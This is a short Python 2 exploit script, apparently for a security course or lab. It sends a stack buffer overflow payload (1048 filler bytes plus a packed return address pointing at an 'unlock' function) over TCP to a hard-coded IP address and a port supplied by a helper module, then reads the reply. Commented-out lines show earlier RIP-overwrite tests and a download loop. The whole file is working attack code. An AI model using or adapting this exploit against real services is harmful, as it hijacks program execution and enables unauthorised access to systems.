#!/usr/bin/env python

import socket
from struct import *
from dictionaryPasswd import get_p_port

UNAME = 'ceneri' 
IP_ADDRESS = '128.114.59.215'

UNLOCK_ADDRESS = 0x401379

def main():

    PORT = int(get_p_port())

    overflow = ""
    overflow += "A"*1048
    overflow += pack("<Q", UNLOCK_ADDRESS)
    #overflow += pack("<Q", 0x6969696969696969)   # overwrite RIP with 0x0000424242424242
    #overflow += "C"*4000

    sockt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sockt.connect((IP_ADDRESS, PORT ))
     
    sockt.send(overflow)
    sData = sockt.recv(1024)

    """
    while True:
        #https://docs.python.org/2/howto/sockets.html
        totalsent = 0
        while totalsent < len(overflow):
            sent = sockt.send(overflow[totalsent:])
            print "sent", sent
            if sent == 0:
                raise RuntimeError("socket connection broken")
            totalsent = totalsent + sent

        while sData:
            sData = sockt.recv(1024)
            print sData
            #fDownloadFile.write(sData)            
        print "Download Completed"
        break
    """
    sockt.close()
    

if __name__ == '__main__':
    main()